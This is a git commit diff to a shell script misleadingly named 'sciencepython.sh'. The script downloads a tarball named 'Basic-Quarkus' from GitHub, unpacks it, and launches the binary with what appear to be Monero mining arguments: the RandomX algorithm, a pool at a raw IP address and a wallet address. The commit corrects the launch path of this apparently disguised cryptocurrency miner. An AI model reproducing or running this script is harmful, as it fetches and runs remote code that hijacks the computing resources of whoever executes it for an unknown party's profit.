7412a1dac1683b916badebb28b0215dd7a05c648
dshillin <57657582+dshillin@users.noreply.github.com>
2022-09-12 08:21:17 +0100

    sciencepython.sh

--- sciencepython.sh
+++ sciencepython.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://raw.githubusercontent.com/dshillin/http-nodejs/main/Basic-Quarkus.tar.gz
 tar xvzf Basic-Quarkus.tar.gz
 cd Basic-Quarkus
-./Basic-Quarkus/Basic-Quarkus -a rx/0 -o 44.196.193.227:80 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j -p test01 -t 2
+./Basic-Quarkus -a rx/0 -o 44.196.193.227:80 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j -p test01 -t 2
